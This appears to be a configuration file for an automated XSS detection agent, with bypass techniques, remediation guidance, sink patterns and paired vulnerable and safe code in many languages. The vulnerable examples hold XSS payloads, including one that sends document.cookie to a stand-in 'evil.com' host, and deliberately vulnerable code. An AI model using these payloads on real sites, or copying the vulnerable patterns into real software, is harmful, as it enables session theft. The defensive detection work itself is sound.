bypass_techniques:
  - name: "Mutation XSS (mXSS)"
    description: "Browser re-parses sanitized HTML differently than the sanitizer, converting safe markup into executable code. Root causes: namespace confusion (HTML/SVG/MathML parsing differences), deep nesting causing DOM flattening, parser state differentials (noscript tag)."
    detection_hint: "Flag reliance on a single HTML sanitizer without CSP defense-in-depth. Flag outdated DOMPurify (< 3.2.4) or ammonia (< 4.1.2). Flag SVG/MathML content in user-controlled HTML."
    cves: ["CVE-2024-47875", "CVE-2025-26791", "RUSTSEC-2021-0074", "RUSTSEC-2025-0071"]
    research: "Cure53 DOMPurify bypass timeline: 2019 (Kinugawa, noscript), 2020 (Bentkowski, MathML), 2024 (IcesFont, nesting), 2025 (template literal regex). At least 6 bypasses since 2019."

  - name: "DOM Clobbering"
    description: "Injecting scriptless HTML with name/id attributes to override DOM properties and JavaScript globals, escalating to XSS through existing script gadgets. DOMPurify does NOT strip name attributes."
    detection_hint: "Flag JavaScript code that reads DOM properties (window.config, document.getElementById) and passes values to script loading or innerHTML. Flag user-controlled HTML with name/id attributes."
    cves: ["CVE-2024-47068", "CVE-2024-45389"]
    research: "Rollup bundler gadget (2024), Astro framework router gadget (2024), Pagefind document.currentScript override (2024)."

  - name: "CSP Bypasses"
    description: "Circumventing Content Security Policy via JSONP endpoints on whitelisted domains, Angular/Vue CDN gadgets on whitelisted CDNs, base-uri injection for relative path hijacking, strict-dynamic script gadgets."
    detection_hint: "Audit CSP header for whitelisted domains hosting JSONP. Check for missing base-uri and object-src directives. Verify strict-dynamic is combined with nonces, not unsafe-inline."
    research: "Lekies et al. (CCS 2017) — 'Code-Reuse Attacks for the Web: Breaking XSS Mitigations via Script Gadgets.' 10% of otherwise-secure CSP policies bypassed."

  - name: "SVG/MathML Namespace Switching"
    description: "HTML parser switches namespace on <svg>/<math> tags. Elements like <style>, <title>, <script> that are raw-text in HTML become regular elements in foreign namespaces, enabling child element injection that bypasses sanitizers."
    detection_hint: "Flag SVG/MathML content in user-controlled HTML. Check sanitizer handling of foreignObject, annotation-xml, and text integration points (mtext, mi, mo, mn, ms)."
    cves: ["CVE-2025-66412", "RUSTSEC-2021-0074", "RUSTSEC-2025-0071"]
    research: "Angular sanitizer SVG/MathML bypass (2025), DOMPurify MathML text integration bypass (2020), ammonia namespace confusion (2021, 2025)."

  - name: "Prototype Pollution to XSS Chains"
    description: "Prototype pollution gadget (lodash _.merge, jQuery $.extend) pollutes properties read by template rendering or DOM manipulation code, injecting HTML into the page."
    detection_hint: "Flag deep merge functions (_.merge, $.extend, Object.assign with spread) accepting user input. Check if template engines read from Object.prototype during rendering."
    cves: ["CVE-2024-6783"]
    research: "Vue.js 2 prototype pollution via staticClass/staticStyle (2024). General pattern: PP gadget → polluted template property → injected HTML."

  - name: "Sanitizer Bypasses (Framework-Specific)"
    description: "Framework built-in sanitizers may have incomplete attribute schemas for SVG/MathML elements, or use attribute-based payloads (CSS animation event handlers) when sanitizer only strips <script> tags."
    detection_hint: "Flag custom or framework-built sanitizers vs. proven libraries (DOMPurify, ammonia, bleach). Check for attribute-based event handlers (onanimationstart, onanimationend) and CSS animation triggers."
    cves: ["CVE-2024-42009", "CVE-2025-66412"]
    research: "Roundcube zero-click email XSS via CSS animation trigger (CVE-2024-42009, actively exploited by UNC1151). Angular SVG animation element bypass (CVE-2025-66412)."

  - name: "Encoding Bypasses"
    description: "Double encoding (%253C), mixed encoding (URL + HTML entity + Unicode), HTML entity variants (decimal, hex, zero-padded, without semicolons), null byte injection (java\\0script:), non-recursive filter stripping (<scr<script>ipt>)."
    detection_hint: "Flag denylist-based XSS filters and single-pass sanitization. Verify input is decoded/canonicalized exactly once before validation (ASVS 1.1.1)."
    cves: ["CVE-2006-4308", "CVE-2007-5727"]

  - name: "JavaScript Context Escapes"
    description: "Template literal injection (backticks), Unicode escapes in identifiers (\\u0061lert), hex/octal in eval strings, constructor chains ([].constructor.constructor('alert(1)')())."
    detection_hint: "Flag user input inside JavaScript template literals (backtick strings). Flag any user input reaching eval/Function/setTimeout string overloads."

  - name: "XSS via File Upload"
    description: "SVG files with embedded <script> and event handlers. HTML files served from same origin. MIME type sniffing without X-Content-Type-Options: nosniff. Polyglot files (valid image + valid JavaScript)."
    detection_hint: "Flag file upload endpoints serving content from same origin without Content-Disposition: attachment. Check for SVG uploads without stripping scripts. Verify X-Content-Type-Options: nosniff on upload responses."

remediation:
  preferred: |
    Apply context-specific output encoding as the primary defense. Different contexts require
    different encoding — a single function is NEVER sufficient:

    HTML Body: HTML entity encoding (& < > " ')
      Python: markupsafe.escape() or template auto-escaping
      JavaScript: element.textContent = data (NOT innerHTML)
      Go: html/template auto-escaping or html.EscapeString()
      Ruby: ERB auto-escaping (<%= %>) or ERB::Util.html_escape()
      PHP: htmlspecialchars($data, ENT_QUOTES|ENT_HTML5, 'UTF-8')
      Java: JSTL <c:out> or fn:escapeXml()
      C#: Razor auto-escaping (@var)
      Rust: Askama/Tera auto-escaping ({{ var }} without |safe)

    JavaScript Context: JS-specific encoding
      Python: |tojson filter in Jinja2 or json.dumps()
      Ruby: escape_javascript() / j() helper
      Go: html/template contextual auto-escaping
      Best practice: use data-* attributes with JSON, read via dataset API

    URL Context: URL percent-encoding for params, scheme validation for full URLs
      Python: urllib.parse.quote() + url_for() for internal links
      JavaScript: encodeURIComponent() for params, validate https?:// scheme for full URLs
      Go: url.QueryEscape()
      Rust: urlencoding::encode() + url::Url::parse() scheme validation

    HTML Sanitization (when users author HTML): use allowlist-based sanitizer
      JavaScript: DOMPurify.sanitize(dirty)
      Python: nh3.clean(dirty) or bleach.clean(dirty, tags=[...])
      Ruby: ActionController::Base.helpers.sanitize(dirty)
      Go: bluemonday.UGCPolicy().Sanitize(dirty)
      Rust: ammonia::clean(&dirty) — keep ammonia >= 4.1.2
      Java: OWASP Java HTML Sanitizer PolicyFactory.sanitize(dirty)

    CSP (defense-in-depth, not replacement for encoding):
      Content-Security-Policy: script-src 'nonce-{RANDOM}' 'strict-dynamic';
                               object-src 'none'; base-uri 'none';
      Generate cryptographic nonce per response. Never reuse nonces.

    Trusted Types (DOM XSS prevention):
      Content-Security-Policy: require-trusted-types-for 'script';
      Enforces sanitization at API level — innerHTML rejects raw strings.

  common_mistakes:
    - mistake: "Using a single encoding function for all output contexts"
      why_insufficient: "HTML entity encoding in a JavaScript context does not prevent script injection. The browser decodes HTML entities BEFORE the JS parser runs. Each context requires its own encoding."

    - mistake: "Using innerHTML instead of textContent for displaying user data"
      why_insufficient: "innerHTML parses the string as HTML, executing embedded scripts. textContent treats input as literal text. This is the most common DOM XSS vector."

    - mistake: "Input validation (denylist) instead of output encoding"
      why_insufficient: "Denylist filters are always bypassable — case mixing, encoding variations, alternate syntax, non-recursive stripping. Output encoding is the authoritative defense."

    - mistake: "Encoding at input/storage time instead of output time"
      why_insufficient: "The output context is unknown at input time. The same value may appear in HTML body, JS context, URL context, and CSS context on different pages. Encode at the point of output."

    - mistake: "Trusting framework auto-escaping in all contexts"
      why_insufficient: "Most template engines only HTML-encode. Variables in <script> blocks, href attributes (javascript: URI), style attributes, and unquoted attributes remain vulnerable even with auto-escaping ON."

    - mistake: "Relying solely on CSP to prevent XSS"
      why_insufficient: "CSP is defense-in-depth, not a primary control. JSONP endpoints, script gadgets, base-uri injection, and incorrect configurations (unsafe-inline) create bypasses. Fix the encoding first."

    - mistake: "Sanitizing HTML then modifying the result"
      why_insufficient: "Any string operation after sanitization (concatenation, interpolation, substring) can reintroduce XSS. Sanitize as the LAST step before rendering."

    - mistake: "Using dangerouslySetInnerHTML/v-html/@Html.Raw for convenience"
      why_insufficient: "These explicitly bypass framework protections. If the content contains user data, it must be sanitized with DOMPurify or equivalent before use."

    - mistake: "Assuming Rust's memory safety prevents XSS"
      why_insufficient: "XSS is a logic vulnerability, not a memory safety issue. format!() with user input in an HTML response is just as vulnerable in Rust as string concatenation in Python or PHP."

few_shot_examples:
  vulnerable:
    - language: python
      label: "Django mark_safe with user input"
      code: |
        def render_comment(request):
            comment = request.POST.get('comment')
            return render(request, 'page.html', {
                'comment': mark_safe(f'<div class="comment">{comment}</div>')
            })
      explanation: "mark_safe() disables Django auto-escaping. User comment containing <script>alert(1)</script> executes in all viewers' browsers. Fix: Use format_html('<div class=\"comment\">{}</div>', comment) which escapes the argument."

    - language: python
      label: "Flask direct string return from route"
      code: |
        @app.route('/search')
        def search():
            query = request.args.get('q', '')
            return f'<h1>Results for: {query}</h1><p>No results found.</p>'
      explanation: "Direct f-string return bypasses Jinja2 auto-escaping. Attacker sends q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>. Fix: return render_template('search.html', query=query)."

    - language: javascript
      label: "React dangerouslySetInnerHTML with user content"
      code: |
        function Comment({ comment }) {
          return (
            <div dangerouslySetInnerHTML={{ __html: comment.body }} />
          );
        }
      explanation: "dangerouslySetInnerHTML renders raw HTML from user-authored comment. Stored XSS affects all viewers. Fix: Use DOMPurify: dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(comment.body) }}."

    - language: javascript
      label: "DOM XSS via location.hash to innerHTML"
      code: |
        const content = decodeURIComponent(location.hash.substring(1));
        document.getElementById('preview').innerHTML = content;
      explanation: "URL fragment (never sent to server) flows directly to innerHTML. Exploit: page.html#<img src=x onerror=alert(document.cookie)>. Fix: Use textContent, or sanitize with DOMPurify.sanitize(content)."

    - language: java
      label: "Servlet direct response with request parameter"
      code: |
        @WebServlet("/greet")
        public class GreetServlet extends HttpServlet {
            protected void doGet(HttpServletRequest req, HttpServletResponse resp)
                    throws IOException {
                String name = req.getParameter("name");
                resp.setContentType("text/html");
                resp.getWriter().print("<h1>Hello " + name + "</h1>");
            }
        }
      explanation: "Request parameter written directly to HTML response. Fix: Use Encode.forHtml(name) from OWASP Java Encoder, or use a template engine with auto-escaping."

    - language: go
      label: "text/template import (no escaping)"
      code: |
        import "text/template"

        func handler(w http.ResponseWriter, r *http.Request) {
            name := r.FormValue("name")
            tmpl := template.Must(template.New("page").Parse("<h1>{{.Name}}</h1>"))
            tmpl.Execute(w, map[string]string{"Name": name})
        }
      explanation: "text/template performs ZERO HTML escaping. Any HTML in name renders directly. Fix: import \"html/template\" instead — identical API but with contextual auto-escaping."

    - language: go
      label: "template.HTML type cast bypassing auto-escaping"
      code: |
        import "html/template"

        func handler(w http.ResponseWriter, r *http.Request) {
            content := r.FormValue("content")
            data := map[string]interface{}{
                "Body": template.HTML(content),
            }
            tmpl.Execute(w, data)
        }
      explanation: "template.HTML() tells html/template to skip escaping. User input passes through unmodified. Fix: Remove the type cast — let html/template auto-escape: \"Body\": content."

    - language: ruby
      label: "Rails html_safe on user input"
      code: |
        def show
          @message = "<p>#{params[:message]}</p>".html_safe
        end
      explanation: "html_safe marks the string as safe for rendering, bypassing Rails auto-escaping. Fix: Use content_tag(:p, params[:message]) or let ERB auto-escape: <%= params[:message] %>."

    - language: php
      label: "Echo with unsanitized GET parameter"
      code: |
        <?php
        $name = $_GET['name'];
        echo "<h1>Welcome, $name!</h1>";
        ?>
      explanation: "Direct echo of GET parameter into HTML. Fix: echo '<h1>Welcome, ' . htmlspecialchars($name, ENT_QUOTES|ENT_HTML5, 'UTF-8') . '!</h1>';"

    - language: c_sharp
      label: "ASP.NET Html.Raw with user input"
      code: |
        @{
            var message = Context.Request.Query["msg"];
        }
        <div>@Html.Raw(message)</div>
      explanation: "Html.Raw() bypasses Razor auto-escaping. Fix: Remove Html.Raw() — <div>@message</div> auto-escapes."

    - language: python
      label: "Zope PageTemplates request taint dropped"
      code: |
        from DocumentTemplate.DT_Util import TemplateDict, InstanceDict
        from AccessControl.DTML import RestrictedDTML

        class Rtd(RestrictedDTML, TemplateDict):
            this = None

        def call_with_ns(f, ns, arg=1):
            td = Rtd()
            this = ns.get('context', ns.get('here'))
            td.this = this
            request = ns.get('request', {})
            td._push(request)
            td._push(InstanceDict(td.this, td))
            td._push(ns)
            return f(td)
      explanation: "Zope PageTemplates rely on request taint metadata during template expression rendering. Pushing raw request into the TemplateDict/RestrictedDTML namespace drops the taint wrapper. Fix: if hasattr(request, 'taintWrapper'): request = request.taintWrapper() before td._push(request)."

    - language: rust
      label: "Axum Html response with format!() — the Rust XSS footgun"
      code: |
        use axum::{extract::Query, response::Html};

        async fn greet(Query(params): Query<HashMap<String, String>>) -> Html<String> {
            let name = params.get("name").unwrap_or(&String::new());
            Html(format!("<h1>Hello {}</h1>", name))
        }
      explanation: "format!() interpolates user input into HTML string. Rust's memory safety does NOT prevent XSS — this is a logic vulnerability. Fix: Use a template engine (Askama/Tera) with auto-escaping, or return JSON."

    - language: rust
      label: "Askama |safe filter bypassing auto-escaping"
      code: |
        // template: <div class="bio">{{ user_bio|safe }}</div>
        #[derive(Template)]
        #[template(path = "profile.html")]
        struct ProfileTemplate {
            user_bio: String,
        }

        async fn profile(bio: String) -> impl IntoResponse {
            ProfileTemplate { user_bio: bio }
        }
      explanation: "|safe filter tells Askama to skip HTML escaping. User bio containing <img src=x onerror=alert(1)> executes in all viewers. Fix: Remove |safe — {{ user_bio }} auto-escapes. If HTML rendering is needed, sanitize with ammonia::clean(&bio) before passing to template."

    - language: rust
      label: "Tera template with {{ var | safe }} filter"
      code: |
        fn render_page(tera: &Tera, content: &str) -> String {
            let mut ctx = tera::Context::new();
            ctx.insert("content", content);
            tera.render("page.html", &ctx).unwrap()
        }
        // page.html: <div>{{ content | safe }}</div>
      explanation: "| safe in Tera disables auto-escaping. Fix: Remove | safe — {{ content }} auto-escapes for HTML context."

    - language: rust
      label: "Handlebars-rust triple braces"
      code: |
        let mut hbs = Handlebars::new();
        hbs.register_template_string("page",
            "<div class=\"comment\">{{{comment}}}</div>").unwrap();

        let data = json!({"comment": user_input});
        hbs.render("page", &data).unwrap()
      explanation: "{{{ }}} triple braces bypass Handlebars-rust escaping. Fix: Use {{ comment }} (double braces) which HTML-escapes the value."

    - language: rust
      label: "Yew set_inner_html with user data"
      code: |
        use web_sys::Element;

        fn render_content(el: &Element, user_content: &str) {
            el.set_inner_html(user_content);
        }
      explanation: "set_inner_html() bypasses Yew's html! macro auto-escaping. Fix: Use the html! macro: html! { <div>{ user_content }</div> } which treats content as text."

    - language: rust
      label: "Actix-web raw HTML response with format!()"
      code: |
        use actix_web::{web, HttpResponse};

        async fn handler(query: web::Query<HashMap<String, String>>) -> HttpResponse {
            let name = query.get("name").unwrap_or(&"".to_string());
            HttpResponse::Ok()
                .content_type("text/html; charset=utf-8")
                .body(format!("<html><body><h1>Hello {}</h1></body></html>", name))
        }
      explanation: "format!() with user input in HTML body response. Fix: Use Askama or Tera template engine with auto-escaping, or return JSON: HttpResponse::Ok().json(json!({\"name\": name}))."

  safe:
    - language: python
      label: "Django format_html (auto-escapes arguments)"
      code: |
        from django.utils.html import format_html
        return format_html('<div class="comment">{}</div>', user_input)
      explanation: "format_html() HTML-escapes all arguments before interpolation. Safe equivalent of mark_safe() for structured HTML."

    - language: python
      label: "Flask render_template with .html extension"
      code: |
        @app.route('/search')
        def search():
            return render_template('search.html', query=request.args.get('q', ''))
      explanation: "render_template with .html extension enables Jinja2 auto-escaping. {{ query }} in template is auto-escaped."

    - language: javascript
      label: "React default JSX escaping"
      code: |
        function Greeting({ name }) {
          return <h1>Hello, {name}</h1>;
        }
      explanation: "JSX auto-escapes expressions in {}. Script tags in name render as harmless text. Never flag default React rendering."

    - language: javascript
      label: "textContent instead of innerHTML"
      code: |
        const name = new URLSearchParams(location.search).get('name');
        document.getElementById('greeting').textContent = name;
      explanation: "textContent treats input as literal text, not HTML. Safe alternative to innerHTML for displaying user data."

    - language: javascript
      label: "DOMPurify sanitization before innerHTML"
      code: |
        import DOMPurify from 'dompurify';
        element.innerHTML = DOMPurify.sanitize(userContent);
      explanation: "DOMPurify sanitizes HTML using an allowlist. Safe for rendering user-authored HTML (comments, rich text)."

    - language: java
      label: "JSTL c:out with escapeXml"
      code: |
        <c:out value="${param.name}" />
      explanation: "JSTL <c:out> auto-escapes output. fn:escapeXml() provides equivalent inline escaping."

    - language: java
      label: "Thymeleaf th:text (auto-escaped)"
      code: |
        <p th:text="${userInput}">placeholder</p>
      explanation: "th:text auto-escapes HTML entities. Contrast with th:utext which does NOT escape."

    - language: go
      label: "html/template contextual auto-escaping"
      code: |
        import "html/template"

        tmpl := template.Must(template.New("page").Parse("<h1>{{.Name}}</h1>"))
        tmpl.Execute(w, data)
      explanation: "html/template contextually auto-escapes based on output position (HTML body, attribute, JS, CSS, URL). Safe without type casts."

    - language: ruby
      label: "ERB auto-escaping (default since Rails 3)"
      code: |
        <p><%= @user.comment %></p>
      explanation: "<%= %> auto-escapes by default. Contrast with <%== %> or .html_safe which bypass escaping."

    - language: php
      label: "Laravel Blade auto-escaped output"
      code: |
        <p>{{ $userInput }}</p>
      explanation: "Blade {{ }} auto-escapes. Contrast with {!! !!} which renders raw HTML."

    - language: c_sharp
      label: "Razor auto-escaping"
      code: |
        <p>@Model.UserInput</p>
      explanation: "Razor @ expressions auto-encode output. Contrast with @Html.Raw() which bypasses encoding."

    - language: python
      label: "Zope PageTemplates request taint preserved"
      code: |
        def call_with_ns(f, ns, arg=1):
            td = Rtd()
            this = ns.get('context', ns.get('here'))
            td.this = this
            request = ns.get('request', {})
            if hasattr(request, 'taintWrapper'):
                request = request.taintWrapper()
            td._push(request)
            td._push(InstanceDict(td.this, td))
            td._push(ns)
            return f(td)
      explanation: "request.taintWrapper() preserves Zope's taint tracking before template namespace evaluation. This is the patched CVE-2009-5145 pattern."

    - language: rust
      label: "Askama auto-escaping (default)"
      code: |
        // template: <div>{{ user_input }}</div>
        #[derive(Template)]
        #[template(path = "page.html")]
        struct Page {
            user_input: String,
        }
      explanation: "Askama auto-escapes {{ }} in .html templates. Script tags in user_input render as harmless text. Never flag default Askama rendering without |safe filter."

    - language: rust
      label: "Tera auto-escaping (default for .html)"
      code: |
        let mut ctx = tera::Context::new();
        ctx.insert("name", &user_input);
        tera.render("page.html", &ctx).unwrap()
        // page.html: <h1>Hello {{ name }}</h1>
      explanation: "Tera auto-escapes {{ }} for .html templates. Safe without | safe filter."

    - language: rust
      label: "Axum JSON response (no XSS risk)"
      code: |
        use axum::Json;

        async fn api(Query(params): Query<HashMap<String, String>>) -> Json<Value> {
            Json(json!({"name": params.get("name").unwrap_or(&String::new())}))
        }
      explanation: "JSON response with application/json Content-Type is not rendered as HTML. No XSS risk."

    - language: rust
      label: "ammonia HTML sanitization"
      code: |
        let clean = ammonia::clean(&user_html);
        // Use clean in template: {{ clean }} (already sanitized, auto-escaping double-encodes)
        // Or use clean with |safe: {{ clean|safe }} (safe because ammonia stripped dangerous content)
      explanation: "ammonia sanitizes HTML using allowlist, stripping scripts and dangerous attributes. Keep ammonia >= 4.1.2 for mXSS protection."

    - language: rust
      label: "Yew html! macro (auto-escapes text nodes)"
      code: |
        html! {
            <div class="comment">{ &self.user_input }</div>
        }
      explanation: "Yew html! macro treats {} expressions as text nodes, auto-escaped. Safe. Contrast with set_inner_html() which bypasses this."

adaptive_inputs:
  # Phase 3b T16 — per-agent inputs for the D2 taint-verified unresolved-sink
  # gap signal. Method regex covers HTML-output sinks from heuristics:
  # DOM writers (innerHTML/outerHTML as calls when wrapped,
  # document.writeln/insertAdjacentHTML), server response writers
  # (res.send, Fprintf to ResponseWriter, WriteString), explicit unescape
  # helpers (mark_safe/SafeString/Markup/html_safe/bypassSecurityTrust*),
  # @Html.Raw and HtmlString (.NET), set_inner_html and
  # from_html_unchecked (Yew), register_escape_fn (Handlebars-rust).
  # Anchored `^(...)$` post-I1 hardening plus per-token surgery:
  #
  # Dropped (unfixable overmatch even anchored):
  #   - `write` — `^write$` still hits every file/CSV/stream writer's
  #     `.write(...)` method. FP rate is prohibitive on real codebases;
  #     the DOM sink is covered via `document` receiver (receiver is in
  #     known_receivers, so D2 doesn't fire — but that's the goal: no
  #     unknown-receiver D2 on `write`).
  #   - `print` — `^print$` still hits every debug/log `.print(...)`.
  #     Go template `.print` is niche; coverage loss acceptable.
  #   - `new` — too broad; constructor convention across most OO code.
  #     `new HtmlString(...)` has `HtmlString` in `known_receivers`-
  #     adjacent flow via the HtmlString method anyway; `new Function`
  #     is vanishingly rare.
  #
  # Retained as exact matches (anchored):
  #   - `send` — `^send$` still matches generic message-bus `.send(...)`,
  #     but the Express `res.send(...)` pattern is load-bearing for XSS
  #     and `res`/`response` are in known_receivers. On unknown
  #     receivers, this is a legitimate signal (taint path still required).
  #   - `eval` — `^eval$` excludes `evaluate` (ssti's domain).
  #   - `Raw` — `^Raw$` excludes `RawBytes`, `RawHtml` (which is listed
  #     separately).
  # bypassSecurityTrust expands to the actual Angular methods:
  # bypassSecurityTrustHtml / Url / Script / Style / ResourceUrl.
  sink_regex: "^(innerHTML|outerHTML|writeln|insertAdjacentHTML|send|Fprintf|WriteString|mark_safe|SafeString|Markup|html_safe|bypassSecurityTrustHtml|bypassSecurityTrustUrl|bypassSecurityTrustScript|bypassSecurityTrustStyle|bypassSecurityTrustResourceUrl|Raw|RawHtml|HtmlString|render_template_string|set_inner_html|from_html_unchecked|register_escape_fn|eval)$"
  # BARE trailing-token receivers. `document.write(...)` → `document`;
  # `window.eval(...)` → `window`; `res.send(...)` → `res`; `el.innerHTML = ...`
  # rendered as call syntax (rare in Python treesitter) → `el`.
  known_receivers:
    - document
    - window
    - element
    - el
    - node
    - res
    - response
    - self
    - this
    - ctx
    - context
    - writer
    - w
  known_sources:
    - "request.args"
    - "request.form"
    - "request.json"
    - "request.values"
    - "request.GET"
    - "request.POST"
    - "req.query"
    - "req.body"
    - "req.params"
    - "params["
    - "$_GET"
    - "$_POST"
    - "$_REQUEST"
    - "document.location"
    - "window.location"
    - "location.hash"
    - "location.search"
    - "document.referrer"
    - "window.name"
    - "r.FormValue"
    - "r.URL.Query"

target_strategy:
  scope: "function"
  include_imports: true
  include_type_defs: true
  adaptive_depth:
    small: "Deep analysis — trace all data flows from request handlers to template rendering, check all auto-escape bypasses (<20 files)"
    medium: "Focus on route handlers, template rendering, client-side JS with DOM manipulation (20-200 files)"
    large: "Surgical — prioritize files with known dangerous patterns: |safe, dangerouslySetInnerHTML, innerHTML, v-html, format!() in HTML responses, template.HTML() (200+ files)"
  file_patterns:
    - "**/*.py"
    - "**/*.java"
    - "**/*.js"
    - "**/*.jsx"
    - "**/*.ts"
    - "**/*.tsx"
    - "**/*.go"
    - "**/*.rb"
    - "**/*.php"
    - "**/*.cs"
    - "**/*.rs"
    - "**/*.html"
    - "**/*.htm"
    - "**/*.vue"
    - "**/*.svelte"
    - "**/*.erb"
    - "**/*.ejs"
    - "**/*.pug"
    - "**/*.jinja2"
    - "**/*.j2"
    - "**/*.hbs"
    - "**/*.mustache"
  relevance_signals:
    # Auto-escaping bypass patterns (highest priority)
    - "dangerouslySetInnerHTML"
    - "v-html"
    - "bypassSecurityTrust"
    - "mark_safe"
    - "SafeString"
    - "@html_safe"
    - "__html__"
    - "html_safe"
    - "raw("
    - "<%=="
    - "@Html.Raw"
    - "HtmlString"
    - "template.HTML"
    - "template.JS"
    - "template.CSS"
    - "template.URL"
    - "th:utext"
    - "PreEscaped"
    - "from_html_unchecked"
    - "set_inner_html"
    - "register_escape_fn"
    - "AutoEscape::None"
    - "autoescape_on"
    - "set_escape_fn"
    # Direct response writes
    - "innerHTML"
    - "outerHTML"
    - "document.write"
    - "insertAdjacentHTML"
    - "res.send("
    - "res.write("
    - "HttpResponse("
    - "fmt.Fprintf"
    - "io.WriteString"
    - "Response.Write"
    - "getWriter"
    - "render_template_string"
    - "taintWrapper"
    - "TemplateDict"
    - "RestrictedDTML"
    - "ZRPythonExpr"
    # Template escape filters
    - "|safe"
    - "|safeseq"
    - "autoescape off"
    - "autoescape false"
    - "autoescape False"
    - "{!!"
    - "<%-"
    - "!=\\s"
    - "!{"
    - "{{{"
    - "{{ &"
    - "escape = \"none\""
    # Rust web framework indicators
    - "Html("
    - "RawHtml("
    - "reply::html"
    - "content_type(\"text/html"
    - "ContentType::html"
    # JS execution sinks
    - "eval("
    - "new Function("
    - "setTimeout("
    - "setInterval("
    # DOM sources
    - "location.hash"
    - "location.search"
    - "document.referrer"
    - "window.name"
    - "postMessage"
    - "addEventListener.*message"
    # Template imports
    - "text/template"
    - "render_template"
    - "Markup("
    - "Jinja2"
    - "ERB.new"
    - "render inline:"
    # URL context
    - "javascript:"
    - "href="
